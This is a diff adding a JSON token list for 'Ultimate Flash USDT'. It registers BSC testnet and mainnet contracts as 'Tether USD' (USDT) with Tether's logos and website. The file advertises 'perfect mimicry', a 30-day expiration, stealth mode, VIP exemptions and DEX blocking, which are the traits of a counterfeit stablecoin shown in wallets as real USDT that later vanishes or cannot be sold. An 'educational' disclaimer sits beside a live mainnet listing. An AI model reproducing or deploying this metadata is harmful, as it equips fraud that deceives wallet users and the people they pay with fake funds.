@@ -1,0 +1,153 @@
+{
+  "name": "Ultimate Flash USDT Token List",
+  "version": {
+    "major": 2,
+    "minor": 0,
+    "patch": 0
+  },
+  "logoURI": "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+  "description": "Ultimate Flash USDT Token List - Perfect Tether USD mimicry with all advanced secrets",
+  "keywords": ["flash", "usdt", "tether", "stablecoin", "ultimate", "advanced", "secrets"],
+  "tokens": [
+    {
+      "chainId": 97,
+      "address": "0x530F1CcC5F828eB7c737830Df0Ad72c1a7C11901",
+      "name": "Tether USD",
+      "symbol": "USDT",
+      "decimals": 6,
+      "logoURI": "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+      "tags": ["stablecoin", "ultimate", "flash", "advanced"],
+      "extensions": {
+        "website": "https://tether.to",
+        "description": "Ultimate Flash USDT - Perfect Tether USD mimicry with all advanced secrets",
+        "explorer": "https://testnet.bscscan.com/token/0x530F1CcC5F828eB7c737830Df0Ad72c1a7C11901",
+        "github": "https://github.com/flash-usdt/ultimate-flash-usdt",
+        "whitepaper": "https://benevolent-longma-082868.netlify.app/ULTIMATE_INTEGRATION_GUIDE.md",
+        "version": "Ultimate Flash USDT v2.0",
+        "features": [
+          "Perfect USDT Mimicry",
+          "Multi-Layer Logo System",
+          "Advanced EIP-747 Integration",
+          "Sophisticated Price Oracle",
+          "VIP Address System",
+          "Stealth Mode",
+          "Custom Expiration Times",
+          "Batch Operations",
+          "Emergency Controls",
+          "CDN Integration",
+          "Token List Generation",
+          "Trust Wallet Assets Support",
+          "CoinGecko Compatibility",
+          "Advanced Metadata",
+          "Ultimate Security"
+        ],
+        "logoFallbacks": [
+          "https://cryptologos.cc/logos/tether-usdt-logo.png",
+          "https://assets.coingecko.com/coins/images/325/small/Tether-logo.png",
+          "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png"
+        ],
+        "cdnUrls": [
+          "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+          "https://gitcdn.xyz/repo/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"
+        ],
+        "priceOracle": {
+          "usd": 1.00,
+          "format": "multiple",
+          "sources": ["internal", "coingecko", "coinmarketcap"]
+        },
+        "flashMechanics": {
+          "enabled": true,
+          "defaultPeriod": "30 days",
+          "customExpiration": true,
+          "vipExemption": true,
+          "stealthMode": true
+        }
+      }
+    },
+    {
+      "chainId": 56,
+      "address": "0x99f97c023D64435c61c92Ad129C73549D0446f3E",
+      "name": "Tether USD",
+      "symbol": "USDT",
+      "decimals": 6,
+      "logoURI": "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png",
+      "tags": ["stablecoin", "ultimate", "flash", "advanced"],
+      "extensions": {
+        "website": "https://tether.to",
+        "description": "Ultimate Flash USDT v3.0 - Perfect Tether USD mimicry with DEX blocking and enhanced price oracle",
+        "explorer": "https://bscscan.com/token/0x99f97c023D64435c61c92Ad129C73549D0446f3E",
+        "github": "https://github.com/flash-usdt/ultimate-flash-usdt",
+        "whitepaper": "https://benevolent-longma-082868.netlify.app/ULTIMATE_INTEGRATION_GUIDE.md",
+        "version": "Ultimate Flash USDT v3.0 - DEX Blocking Enhanced",
+        "features": [
+          "Perfect USDT Mimicry",
+          "Multi-Layer Logo System",
+          "Advanced EIP-747 Integration",
+          "Sophisticated Price Oracle",
+          "VIP Address System",
+          "Stealth Mode",
+          "Custom Expiration Times",
+          "Batch Operations",
+          "Emergency Controls",
+          "CDN Integration",
+          "Token List Generation",
+          "Trust Wallet Assets Support",
+          "CoinGecko Compatibility",
+          "Advanced Metadata",
+          "Ultimate Security"
+        ],
+        "logoFallbacks": [
+          "https://cryptologos.cc/logos/tether-usdt-logo.png",
+          "https://assets.coingecko.com/coins/images/325/small/Tether-logo.png",
+          "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png"
+        ],
+        "cdnUrls": [
+          "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
+          "https://gitcdn.xyz/repo/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"
+        ],
+        "priceOracle": {
+          "usd": 1.00,
+          "format": "multiple",
+          "sources": ["internal", "coingecko", "coinmarketcap"]
+        },
+        "flashMechanics": {
+          "enabled": true,
+          "defaultPeriod": "30 days",
+          "customExpiration": true,
+          "vipExemption": true,
+          "stealthMode": true
+        }
+      }
+    }
+  ],
+  "timestamp": "2025-07-16T02:35:00.000Z",
+  "metadata": {
+    "creator": "Ultimate Flash USDT Team",
+    "contact": "https://benevolent-longma-082868.netlify.app",
+    "documentation": "https://benevolent-longma-082868.netlify.app/ULTIMATE_INTEGRATION_GUIDE.md",
+    "repository": "https://github.com/flash-usdt/ultimate-flash-usdt",
+    "license": "MIT",
+    "disclaimer": "For educational purposes only. Use responsibly and in compliance with local laws.",
+    "version": "Ultimate v2.0",
+    "totalSecrets": 15,
+    "compatibility": ["MetaMask", "Trust Wallet", "SafePal", "Binance Chain Wallet", "WalletConnect"],
+    "networks": ["BSC Testnet", "BSC Mainnet"],
+    "features": {
+      "perfectMimicry": true,
+      "multiLayerLogos": true,
+      "advancedEIP747": true,
+      "priceOracle": true,
+      "vipSystem": true,
+      "stealthMode": true,
+      "customExpiration": true,
+      "batchOperations": true,
+      "emergencyControls": true,
+      "cdnIntegration": true,
+      "tokenListGeneration": true,
+      "trustWalletAssets": true,
+      "coinGeckoCompatibility": true,
+      "advancedMetadata": true,
+      "ultimateSecurity": true
+    }
+  }
+}
